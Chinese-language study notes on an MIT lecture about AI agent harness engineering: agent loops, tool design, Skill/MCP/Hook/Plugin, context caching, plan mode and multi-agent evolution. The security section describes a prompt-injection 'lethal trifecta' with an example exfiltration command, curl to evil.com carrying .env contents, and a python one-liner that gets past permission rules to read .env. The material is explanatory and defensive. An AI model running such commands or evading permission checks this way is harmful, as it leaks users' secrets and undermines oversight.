# MIT MAS.S62 · Self-Evolving AI · Fall 2026 · Week 06 学习笔记
## Harness Evolution 2：Harness 工程与多智能体演化

> **说明**：本笔记基于官方幻灯片整理，并非课堂逐字稿；未核验课堂口头讲述。所有内容仅依据幻灯片抽取文本，页面之间的重复、页码与 OCR 失真不作为论证依据。幻灯片中的图表、代码片段与问答框可能存在提取缺失，凡涉及具体图示结构的描述均标注不确定性。英文术语保留原文。文末仅列输入中给出的官方幻灯片 URL。

---

## 一、学习目标

读完本讲材料后，应当能够：

1. **用 Harness 视角重新定义 Agent**：理解 `Agent = Model + Harness`，并能指出 Harness 由上下文（Context）、工具（Tools）、控制循环（Control loop）、安全（Safety）四部分组成（幻灯片 3–4）。
2. **读懂最小 Agent 循环**：能从 ReAct 循环图与 `mini-swe-agent` 的代码结构（`query` / `parse_action` / `execute_action` / `run`）说明模型与 Harness 各自负责什么（幻灯片 5–13）。
3. **理解工具设计即提示工程**：能解释工具 schema、description、输出格式、错误信息如何影响模型行为，并比较 bash-only 与专用工具的取舍（幻灯片 16–25）。
4. **区分四种 Harness 扩展机制**：Skill、MCP、Hook、Plugin 的触发方式、上下文成本与适用场景（幻灯片 26–35）。
5. **掌握上下文管理与提示缓存**：理解上下文是有限资源、缓存命中/失效的条件、以及截断/掩码/压缩/卸载/子智能体等策略（幻灯片 36–38）。
6. **理解计划模式、记忆与子智能体**：说明它们如何以“文件 + 状态切换”的方式在 Harness 层实现（幻灯片 39–42）。
7. **判断多智能体何时有益、何时有害**：能引用幻灯片给出的任务结构、模型差异、工具数量、异构混合、可预测性等发现（第二份幻灯片 25–30）。
8. **了解多智能体演化**：以 CORAL 为例说明多智能体特化、共享记忆、心跳机制与跨智能体信息传递（第二份幻灯片 31–39）。
9. **建立安全底线意识**：理解“致命三要素”（Lethal Trifecta）与权限规则/沙箱的分工（幻灯片 45–46）。

---

## 二、核心概念

### 2.1 什么是 Harness

幻灯片给出的核心等式是：

```
Agent = Model + Harness
```

Harness 包含四个部分：**Context（上下文）**、**Tools（工具）**、**Control loop（控制循环）**、**Safety（安全）**，模型位于中心（幻灯片 3）。幻灯片引用两组经验证据说明 Harness 的重要性：

- 引用 Merrill 等（Terminal-Bench, ICLR 2026）的排行榜说法：**同一模型、9 种 Harness，成功率从 58.0% 到 76.4%**。
- 引用 Pan 等（HarnessTax, 2026）的说法：**同一模型成功率大致相同，但成本可达 2 倍**。

> 解释：这两条说明 Harness 既影响“能不能做成”，也影响“花多少代价做成”。具体数值来自幻灯片引用的外部工作，本笔记未核验其实验设置。

### 2.2 Agent 循环（The Agent Loop）

幻灯片用 ReAct（Yao 等, ICLR 2023）的循环图说明：Task → Thought → Action → Observation →（继续循环）或（无 action）→ Answer。幻灯片明确回答了一个关键划分问题：

- **属于模型的**：Thought、Action、Answer；
- **属于 Harness 的**：运行 Tool、返回 Observation、驱动循环（幻灯片 5）。

对应的伪代码（幻灯片 6）非常直白：

```python
messages = [{"role": "system", "content": SYSTEM},
            {"role": "user",   "content": task}]
while True:
    reply = llm(messages)                 # model: Thought + Action
    messages.append({"role": "assistant", "content": reply})
    action = parse_action(reply)          # harness parses the action
    if action is None:
        return reply                      # no action → Answer
    output = execute(action)              # harness runs the Tool
    messages.append({"role": "user", "content": output})  # Observation → context
```

幻灯片 7 补充了 Codex 的循环形态：**一个 turn = 多次模型调用，直到不再有 tool call；下一个 turn 会把整段历史重新放回上下文**。幻灯片 8 指出模型开局看到的提示约 **47k tokens**（`gpt-5.2-codex_prompt.md`），且 **repo 不在提示里，需要用工具读取**。这些数字为幻灯片原文引用，本笔记未独立核验。

### 2.3 深入 mini-swe-agent

幻灯片 9 概括其特点：**约 100 行代码、bash 是唯一工具、线性历史、每个 action 一个子进程、SWE-bench Verified 上 >74%**。以下要点均来自幻灯片 10–15 的代码与问答：

- **`query()`**：每次模型调用前检查 `n_calls` 与 `cost` 是否超限，超限抛 `LimitsExceeded`（终止型）。幻灯片问答解释：**不会提交的 Agent 会无限循环，限制在步数或成本上限处停止它**。
- **`parse_action()`**：用正则提取 ` ```bash ` 代码块；若数量不等于 1，抛 `FormatError`，把错误作为下一条消息返回，让模型自行修正格式。
- **`execute_action()`**：每条命令有 **30 秒超时**；超时抛 `ExecutionTimeoutError`，提示模型换做法。每个 action 用新的 `subprocess.run`，而不是保持一个长驻 shell；幻灯片给出的理由是：长驻 shell 难以判断输出何时结束，且一条坏命令会污染后续所有步骤；代价是 `cd`、`export` 不跨命令保留，模型需写 `cd src && pytest`。
- **Observation 模板**：输出过长时只保留**前 5000 与后 5000 字符**，中间标注省略字符数，并提示用 `head / tail / sed / grep` 缩小范围。幻灯片问答：完整日志会淹没上下文，首尾通常足以说明“跑了什么、怎么失败”。
- **完成方式**：执行 `echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT` 提交。
- **`run()` 用异常做控制流**：`NonTerminatingException`（格式错误、超时）作为消息回给模型；`TerminatingException`（已提交、超限）结束运行。幻灯片问答：错误发生在 `query`、`parse_action`、`execute_action` 深处，`run()` 集中处理。
- **真实任务示例**（幻灯片 14）：django-11099，24 步提交，花费 $0.19，隐藏测试通过。该数值为幻灯片原文，未核验。
- **人在回路**（幻灯片 15）：`InteractiveAgent` 在 `confirm` 模式下执行前询问用户；用户输入非空则抛 `NonTerminatingException`，把“用户拒绝 + 留言”作为下一条消息交给模型。

> 解释：mini-swe-agent 的价值在于展示“Harness 的最小充分集”——循环、解析、执行、限额、观察格式化、终止协议。它同时说明复杂 Harness 的许多能力可以被压缩进极简设计。

### 2.4 工具与工具设计

**必备工具对照**（幻灯片 16）：Claude Code 与 Codex 都覆盖 Read、Search（按文件名 Glob / 文本 Grep；Codex 用 `rg --files` / `rg`）、Edit（字符串替换 / `apply_patch`）、Execute（Bash / `exec_command`）、Web、Plan、Delegate、Ask user。mini-swe-agent 则用 bash 一个工具覆盖 Read、Search、Edit、Execute。

**同一编辑任务的不同表达**（幻灯片 17）：把 `^…$` 改为 `\A…\Z`。Claude Code 用 `Edit` 的 `old_string`/`new_string`/`replace_all`；Codex 用 `apply_patch` 的 diff 格式；mini-swe-agent 用 `sed -i`。这说明**工具形态决定了模型输出的语法**。

**工具格式三段式**（幻灯片 18）：① schema 随请求发送（name + description + input_schema）；② 模型输出 `tool_use`；③ Harness 执行并返回 `tool_result`。幻灯片强调：**模型看到的是 name + description + schema，因此 description 就是提示**。

**工具描述是提示**（幻灯片 19）：Anthropic 为 SWE-bench 设计的 `str_replace_editor` 描述中包含输出截断说明、`old_str` 必须精确匹配且唯一的注意事项等；幻灯片引用 Anthropic 的说法：在对工具描述做精确改进后达到当时 SOTA（幻灯片标注 49%，此前最佳 45%）。

**更少工具、不重叠**（幻灯片 20）：Vercel 的 text-to-SQL agent 从 17 个工具减到 2 个（`ExecuteCommand`、`ExecuteSQL`），幻灯片表格给出：成功率 4/5 → 5/5，平均时间 274.8s → 77.4s，平均 token ~102k → ~61k，平均步数 ~12 → ~7。

**工具搜索工具（Tool Search Tool）**（幻灯片 21–22）：仅标题与图示，文字提取有限，具体机制**保留不确定性**。

**为 Agent 而非人类设计工具**（幻灯片 23）：SWE-bench Lite 上 GPT-4 Turbo 的解决率——无搜索工具 15.7%；迭代式搜索（类似编辑器 Ctrl+F，逐条 `next`）12.0%；摘要式搜索（一次列出全部匹配，超过 50 条则要求更窄查询）18.0%。幻灯片点明：**迭代搜索模仿了编辑器搜索，反而低于无搜索**。

**简洁输出与有帮助的错误**（幻灯片 24）：同一结果 detailed 206 tokens vs concise 72 tokens；错误信息应说明“下一步怎么做”（如指出 `userId` 非法、列出合法 ID、提示调用 `user_search()`），而非仅返回 `RESOURCE_NOT_FOUND`。

**Bash 还是专用工具**（幻灯片 25）：bash 侧证据包括 mini-swe-agent 74.4%、CodeAct 代码动作 74.4% vs JSON 工具调用 52.4%、Cloudflare 的“LLM 见过很多代码，没见过很多 tool call”；专用工具侧优势是权限（Read/Grep 免询问）、并行（Read/Glob/Grep 可并行，Edit/Bash 串行）、精确编辑（Edit 在 0 或 2+ 匹配时失败，`sed` 两种情况都退出 0）、撤销（rewind 能恢复 Edit，不能恢复 bash 里的 `rm`/`mv`）。结论：**bash 取广度，工具取保证**。

### 2.5 扩展机制：Skill、MCP、Hook、Plugin

幻灯片 26 的对照表：

| 机制 | 是什么 | 触发 | 上下文成本 |
|---|---|---|---|
| Skill | procedures（流程） | 模型或 `/name` | ~100 tokens |
| MCP | external tools（外部工具） | 模型调用 | 工具名 |
| Hook | 你在生命周期事件上的代码 | Harness，总是触发 | 零 |
| Plugin | 上述内容的打包 | 用户安装 | 各部分之和 |

并补充：`CLAUDE.md` / `AGENTS.md` **总是加载、从不强制执行**。

**Skill 格式**（幻灯片 27）：一个文件夹，`SKILL.md` 必需，可含 `scripts/`、`references/`、`assets/`；frontmatter 中 `name` 必需（≤64 字符、小写连字符、与文件夹同名）、`description` 必需（≤1024 字符，说明做什么与何时用），可选 license、compatibility、metadata、allowed-tools。幻灯片指出这是开放标准，Claude Code、Codex、Gemini CLI、GitHub Copilot、Cursor 读同一份 `SKILL.md`。

**渐进披露（Progressive Disclosure）**（幻灯片 28）：① frontmatter 的 name + description 总是加载，约 100 tokens/skill；② `SKILL.md` 正文在触发时加载，<5k tokens；③ 附带文件与脚本只在需要时读取。幻灯片引用 Anthropic 称这是让 Agent Skills 灵活可扩展的核心设计原则。

**MCP**（幻灯片 29–32）：一个外部工具协议。示例 `weather.py` 用 `@mcp.tool()` 暴露 `get_forecast`、`get_alerts`，通过 stdio 运行；`claude mcp add` 注册后，会话开始时启动。架构为 **Host（Agent 循环 + 模型，每个 server 建一个 client）— Client（与恰好一个 server 的一条连接）— Server（提供 tools、resources、prompts，本地或远程）**，传输为 stdio（本地）或 HTTP（远程），消息为 JSON-RPC：`tools/list` 发现、`tools/call` 调用。幻灯片强调：**每个 host 与 server 各实现一次 MCP，而非为每一对写定制连接器**。

**Hook**（幻灯片 33）：在生命周期事件（SessionStart、PreToolUse、PostToolUse、Stop）上运行确定性代码。图示细节提取有限。

**Plugin**（幻灯片 34）：打包分享整套配置，含 `.claude-plugin/plugin.json`（仅 `name` 必需），通过 marketplace 安装。

**机制选择问答**（幻灯片 35）：禁止访问密钥 → PreToolUse hook / deny 规则（+ 沙箱）；每次编辑后格式化 → PostToolUse hook；查 Google Calendar → MCP；代码评审清单 → Skill；“总是用 uv 不用 pip” → `CLAUDE.md`；20 个仓库共享同一套配置 → Plugin。

### 2.6 上下文管理与提示缓存

幻灯片 36 引用 Hong 等（Chroma 2025）的 Context Rot：**focused ~300 tokens vs full ~113k tokens，每个模型都会退化**；目标是“最小的高信号 token 集合”。

**提示缓存**（幻灯片 37）：缓存输入价格为 0.1×；原则是**静态内容在前、只追加不修改、工具顺序稳定**。幻灯片问答：时间戳放顶部 → 每次调用都 miss；会话中途 MCP 增加工具 → 因工具变化而 miss；用户输入新消息 → 命中（追加）。

**压缩上下文的策略**（幻灯片 38）：截断输出、掩码旧观察、压缩（摘要）、卸载到文件、隔离到子智能体。幻灯片引用 Lindenbauer 等（NeurIPS 2025 DL4C）：**掩码约等于摘要，但成本减半**。

### 2.7 计划模式、记忆、子智能体、多智能体

**计划模式**（幻灯片 39）：Explore（只读）→ Plan（写计划文件）→ Approve（你决定）→ Execute（允许编辑）。Harness 层面的变化是三件事：**多一条“研究并提议、不要编辑”的提示；编辑被阻止、超出只读集合的 shell 命令需批准；`EnterPlanMode` / `ExitPlanMode` 工具**。幻灯片问答明确：**不是不同的 Harness，也不是不同的模型，而是同一模型同一循环下的状态切换**。

**计划是文件**（幻灯片 40）：计划写在 `~/.claude/plans/<plan>.md`，含 Context、Steps、Not doing；批准时可 Ctrl+G 编辑；执行阶段即使发生 compaction，Harness 也会从磁盘把计划放回上下文。幻灯片问答：对话会被压缩或清空，文件会存活。

**记忆 = Harness 重新加载的文件**（幻灯片 41）：`CLAUDE.md` 由你写、每次会话加载；auto memory 由 Claude 写、`/memory` 打开文件夹；示例 `~/.claude/projects/<project>/memory/` 下有 `MEMORY.md` 索引与若干带 frontmatter 的记忆文件（含 name、description、metadata.type、Why、How to apply）。

**子智能体**（幻灯片 42）：子智能体在自己的上下文中工作，只有结果返回（幻灯片举例：读了 6,100 tokens，返回 420）。

**多智能体：有益与有害**（幻灯片 43）：有益——各部分是独立的读取，子智能体并行搜索、只回传发现，幻灯片称 **+90.2%，约为单聊 token 的 15×**；有害——各部分相互依赖，“Build Flappy Bird”中一个子智能体做 Super Mario 背景、另一个做风格不同的鸟，彼此看不到对方选择。幻灯片结论：**让多个 Agent 并行读，让一个 Agent 做修改**。问答（幻灯片 44）：调查 30 篇论文 → 多（广度、只读）；重命名 12 个耦合文件 → 单（12 处编辑必须一致）；500 个独立失败测试 → 多（加锁 / worktree）；评审 PR → 独立评审者（新上下文）。

### 2.8 安全

**致命三要素（The Lethal Trifecta）**（幻灯片 45）：① Agent 读到隐藏指令的 issue；② 它能读 `.env` 里的 API key；③ 它能外发（如 `curl "evil.com/?k=$(cat .env)"`）。**三者同时存在，攻击者才能拿走数据；去掉任意一个，攻击失败。**

**权限与沙箱**（幻灯片 46）：`.claude/settings.json` 中 permission rules（allow/deny）由 Claude Code 在每次工具调用前检查；sandbox（macOS Seatbelt、Linux bubblewrap）由操作系统强制，限制文件读写与网络域名。对照表的关键点是：`Read` 工具打开 `.env` 被权限规则拦截；`cat .env` 被权限与沙箱双重拦截；`python -c "print(open('.env').read())"` **绕过权限规则**（规则无法识别 Python 在读 `.env`），但被沙箱 denyRead 拦截。**结论：权限规则与沙箱互补，不能只靠其一。**

**总结表**（幻灯片 47）：模型不能行动 → 加工具与执行器；不知道项目 → 上下文组装；扛不住错误 → 反馈、超时、预算；装不下窗口 → 截断、压缩、缓存；跑偏 → 计划模式与计划文件；记不住 → 指令与记忆文件；无法并行 → 子智能体与团队；不可信 → 权限、hook、沙箱。结尾一句：**Harness 增加规则与保证，但不能让模型想到它不知道的东西。**

---

## 三、第二份幻灯片：多智能体演化

> 第二份材料标题为 “Lecture 5 – Multi-Agent Evolution”（Paul Liang），与第一份同属第 5 讲 Harness Engineering 序列。以下要点仅取自幻灯片文本。

### 3.1 Harness 回顾

Harness 被概括为“围绕模型的代码，管理上下文与执行流以完成任务”，五个维度：Context（prompt、memory、检索信息）、Control（规划、路由、多智能体编排）、Action（工具、skill、RAG、API、环境）、Evaluation（验证、安全、人类反馈）、Evolution（反思、更新、学习）（幻灯片 4）。记忆回顾（幻灯片 5）给出三维：存什么（feedback、skills、trajectories、semantic facts）、怎么表示（多模态、结构化文本、参数、上下文、外部）、怎么复用（retrieve、adapt、compose、transfer）。Harness 演化回顾（幻灯片 6）：MEM1 把记忆当作上下文中由 LLM 自主更新的内部状态；CLM 把整个上下文当作由 LLM 自主维护重写的持久文件；Meta-Harness 把整个 Harness 当作由 LLM 自主修改的文件系统；共同点是简单、无需手工工程、端到端、可扩展；RLM 在任务分解与上下文管理上更有结构（递归调用子智能体），但同样高度可扩展。

### 3.2 规划与任务分解

三个关键问题（幻灯片 8）：**规划何时有用、何时有害？如何表示计划？计划何时制定、何时改变？**

- **通过提示规划**（幻灯片 9–10）：CoT 引出推理；Least-to-Most 支持模块化、专用模型、规划者与执行者分离。幻灯片判断：**基于提示的规划适用于纯文本、无动作、可逆的场景；若计划作用于世界、改变 Agent 状态或不可逆，就需要边规划边重规划**。
- **引导与编排模型**（幻灯片 11）：规划模型更大、有视觉 grounding，但不擅长低层动作；单独的小 7B 执行模型把计划映射为坐标动作。
- **Web Agent 中的规划**（幻灯片 12）：高层推理、观察解析、低层动作生成；观察为 Accessibility Tree + Image。
- **人在回路规划**（幻灯片 13）：计划不确定时向人澄清；示例中零样本计划“太模糊”，少样本计划漏了排序，澄清后后续生成变正确。
- **训练规划者**（幻灯片 14）：教师模型合成计划 + 对规划模型与执行模型做 SFT。
- **校准规划**（幻灯片 15）：多次采样高层计划以估计不确定性。
- **重规划**（幻灯片 16）：在具身环境中规划、行动、观察反馈、再规划；主要挑战是需要采取安全且不可逆的动作。
- **测试时规划与交互**（幻灯片 17–18）：不只是思考，而是真正执行、看反馈、重试。

### 3.3 多智能体系统

- **组合形态**（幻灯片 19）：规划/编排 Agent + 执行 Agent；去中心化 Agent + 聚合函数；多模态 Agent 各处理不同模态。
- **去中心化**（幻灯片 20–21）：多个语言模型实例提出答案、互相批评、多轮辩论后给最终答案。
- **中心化**（幻灯片 22–24）：幻灯片强调强编排者的重要性（图示细节提取有限，**保留不确定性**）。
- **多智能体何时有效**（幻灯片 25–30），五条发现：
  1. **只对特定任务有益**：金融 Agent 任务自然可分解（收入/成本/市场），MAS 胜 +81%；PlanCraft 有顺序依赖（动作 1 影响动作 2），MAS 输 -70%。指南：可并行 → 中心化；需探索 → 去中心化；顺序依赖 → 单 Agent。
  2. **不同基座模型成本-性能权衡不同**：OpenAI 随成本上升性能平台化；Google 成本更高性能更高；Anthropic 上 MAS 可能反而变差。
  3. **增加 Agent 数量不总提升性能**：工具密集任务（如 16 工具工作流）受协调开销拖累，环境越复杂惩罚越累积。
  4. **异构混合可胜过更强基座**：不必处处用昂贵模型；若单 Agent 基线 >45%，MAS 反而有害；便宜的编排者 + 昂贵的执行子智能体似乎效果好。
  5. **系统性能可预测**：以模型、任务、MAS 设置为参数的 scaling law 在 87% 情况下预测最佳架构；特征包括基座智能、Agent 数、工具数、单 Agent 基线、效率、开销、轨迹错误、消息密度、冗余。

### 3.4 多智能体演化（CORAL）

幻灯片 31 指出 MAS 不总有效且依赖关键超参（任务、基座模型、拓扑），因此出现自动化 MAS 设计空间的尝试。可演化对象：个体模型与 Agent（模型、上下文、Harness）；MAS（角色、通信、拓扑）；共享信息（共同记忆、工具、技能）。

**CORAL**（Qu 等, COLM 2026）的关键思想（幻灯片 33）：多智能体特化、更高自主性、共享记忆、心跳机制（heartbeat）。应用场景包括 kernel engineering、operations research、systems engineering、scientific discovery（幻灯片 34）。幻灯片称在数学、算法、系统优化等 8 个任务上取得新 SOTA（幻灯片 35）；多智能体演化相对单 Agent 带来 **4%–20%** 的增益（幻灯片 37）。

**分析**（幻灯片 38–39）：① 知识积累（笔记与技能记忆）重要；② 多智能体共同演化优于多个独立 Agent；③ 跨 Agent 信息传递：kernel engineering 上 **36% 的尝试以另一个 Agent 为父本，这些尝试改进率 17%，而全部尝试为 9%**；④ 探索多样性：Agent 词汇重叠 Jaccard 相似度 0.3–0.4，即过半探索是独特的；⑤ 贡献均衡：各 Agent 演化尝试次数与成功率大致相近。

---

## 四、方法比较

### 4.1 模型 vs Harness 的职责边界

| 能力 | 归属 | 依据 |
|---|---|---|
| Thought / Action / Answer | 模型 | 幻灯片 5 |
| 运行工具、返回观察、驱动循环 | Harness | 幻灯片 5 |
| 解析 action、格式纠错 | Harness | 幻灯片 10 |
| 步数/成本限额、超时 | Harness | 幻灯片 10–11 |
| 工具 schema 与描述 | Harness 提供，模型消费 | 幻灯片 18–19 |

### 4.2 Bash-only vs 专用工具

| 维度 | Bash / 代码 | 专用工具 |
|---|---|---|
| 代表证据 | mini-swe-agent 74.4%；CodeAct 74.4% vs 52.4% | 权限、并行、精确编辑、撤销 |
| 权限 | 需询问 | Read/Grep 免询问 |
| 并行 | 串行 | Read/Glob/Grep 可并行 |
| 编辑精确性 | `sed` 在 0 或 2+ 匹配时仍退出 0 | Edit 在 0 或 2+ 匹配时失败 |
| 撤销 | 无法恢复 `rm`/`mv` | rewind 可恢复 Edit |
| 结论 | 取广度 | 取保证 |

### 4.3 四种扩展机制

| 机制 | 触发者 | 上下文成本 | 典型用途 |
|---|---|---|---|
| Skill | 模型或 `/name` | ~100 tokens（frontmatter） | 流程、清单 |
| MCP | 模型调用 | 工具名 | 外部系统集成 |
| Hook | Harness 总是触发 | 零 | 确定性拦截/格式化 |
| Plugin | 用户安装 | 各部分之和 | 跨仓库分享整套配置 |

### 4.4 上下文压缩策略

| 策略 | 特点 | 幻灯片依据 |
|---|---|---|
| 截断输出 | 保留首尾，提示缩小查询 | 幻灯片 12 |
| 掩码旧观察 | 约等于摘要、成本减半 | 幻灯片 38 |
| 压缩（摘要） | 可能丢失细节 | 幻灯片 38 |
| 卸载到文件 | 持久、可重读（计划文件即例） | 幻灯片 38、40 |
| 隔离子智能体 | 只回传结果 | 幻灯片 42 |

### 4.5 单 Agent vs 多 Agent

| 任务特征 | 建议 | 依据 |
|---|---|---|
| 广度、只读、可并行 | 多 Agent | 幻灯片 43–44；第二份 26 |
| 强顺序依赖、编辑需一致 | 单 Agent | 第二份 26、44 |
| 工具密集 | 警惕协调开销 | 第二份 28 |
| 单 Agent 基线 >45% | MAS 可能有害 | 第二份 29 |
| 需要新鲜上下文评审 | 独立评审者 | 幻灯片 44 |

### 4.6 权限规则 vs 沙箱

| 攻击面 | 权限规则 | 沙箱 |
|---|---|---|
| `Read` 工具读 `.env` | 拦截 | 不适用（非 shell） |
| `cat .env` | 拦截 | 拦截 |
| `python -c "open('.env').read()"` | **绕过** | 拦截 |

结论：二者互补（幻灯片 46）。

---

## 五、局限与不确定性

1. **幻灯片本身承认的边界**：Harness“增加规则与保证，但不能让模型想到它不知道的东西”（幻灯片 47）。计划模式不是新模型或新 Harness，只是状态切换（幻灯片 39）。
2. **多智能体并非普遍更优**：幻灯片明确列出反例（PlanCraft -70%）、模型差异（Anthropic 上可能变差）、工具密集惩罚、单 Agent 基线 >45% 时有害（第二份 26–29）。
3. **工具并非越多越好**：17 → 2 的 Vercel 案例与迭代搜索低于无搜索的 SWE-bench Lite 结果都指向“少而清晰”（幻灯片 20、23）。
4. **数值均来自幻灯片引用的外部工作**：58.0%→76.4%、2× 成本、47k tokens、74.4%、49%/45%、274.8s/77.4s、+90.2%/15×、+81%/-70%、4%–20%、36%/17%/9%、0.3–0.4 Jaccard、87% 等，本笔记**未独立核验**，不应作为可复现实验结论引用。
5. **图表与代码提取缺失**：Tool Search Tool 的工作原理（幻灯片 21–22）、Hook 生命周期图（幻灯片 33）、中心化 MAS 架构图（第二份 22–24）、CORAL 架构图（第二份 32–34）在抽取文本中信息有限，相关机制描述**保留不确定性**。
6. **两份幻灯片的关系**：第一份标注 “Lecture 5 - Harness Engineering”（Ao Qu），第二份标注 “Lecture 5 – Multi-Agent Evolution”（Paul Liang）；课程页将其归入 week-06 Harness evolution 2。本笔记按输入原样呈现，不推断课堂组织方式。
7. **未虚构内容**：本笔记未添加课堂对话、实验数值、作业要求或参考文献；第二份幻灯片中的 “Homework 1 extended, due Oct 15”“midterm report Oct 28” 等公告属于幻灯片原文，仅作转述，不视为本课程作业要求。

---

## 六、复习清单

**概念自检**

- [ ] 能写出 `Agent = Model + Harness` 并说出 Harness 四组件。
- [ ] 能画出 ReAct 循环并标注哪些步骤属于模型、哪些属于 Harness。
- [ ] 能解释 `parse_action` 为何在 bash 块数量 ≠1 时抛 `FormatError`。
- [ ] 能解释每条命令 30 秒超时与“每 action 一个新子进程”的取舍。
- [ ] 能说明观察模板只保留首尾 5000 字符的理由。
- [ ] 能区分 `NonTerminatingException` 与 `TerminatingException` 的处理路径。
- [ ] 能解释“工具 description 就是提示”，并举例说明精确描述带来的差异。
- [ ] 能复述 Vercel 17→2 工具与 SWE-bench Lite 三种搜索方式的对比结论。
- [ ] 能列出 bash 与专用工具各自的三项优势。
- [ ] 能用一张表区分 Skill / MCP / Hook / Plugin 的触发与上下文成本。
- [ ] 能解释渐进披露的三层加载。
- [ ] 能说明 MCP 的 Host / Client / Server 分工与 JSON-RPC 的 `tools/list`、`tools/call`。
- [ ] 能说出提示缓存的三条原则，并判断“时间戳置顶”“会话中途加 MCP 工具”“用户追加消息”的命中结果。
- [ ] 能解释计划模式只是状态切换，以及计划为何要落盘为文件。
- [ ] 能说明子智能体“只回传结果”的上下文意义。
- [ ] 能复述致命三要素，并说明去掉任一要素为何攻击失败。
- [ ] 能解释为何 `python -c "open('.env').read()"` 能绕过权限规则却被沙箱拦截。

**判断与设计自检**

- [ ] 给定一个任务，能判断应单 Agent 还是多 Agent，并给出理由（并行性、依赖、工具密度、基线）。
- [ ] 给定一个需求（禁密钥、格式化、外部日历、评审清单、统一规范、跨仓库分享），能选出对应机制。
- [ ] 能指出一个 Harness 设计中可能造成缓存 miss 的三处写法。
- [ ] 能说明多智能体演化的可演化对象三层（个体、系统、共享信息）与 CORAL 的四条关键思想。
- [ ] 能用自己的话解释“Harness 能加保证，但不能替模型想到它不知道的事”。

**易错点提醒**

- [ ] 不要把幻灯片引用的外部数值当作本课程实验结论。
- [ ] 不要认为“更多 Agent 一定更好”或“更多工具一定更强”。
- [ ] 不要认为计划模式换了模型或换了 Harness。
- [ ] 不要只依赖权限规则或只依赖沙箱。

---

## 参考来源（仅输入中给出的官方幻灯片 URL）

- https://mit-mi.github.io/how2ai-course/fall2026/schedule/harness%20engineering%20tutorial.pdf
- https://mit-mi.github.io/how2ai-course/fall2026/schedule/lec5%20-%20multi%20agent.pdf
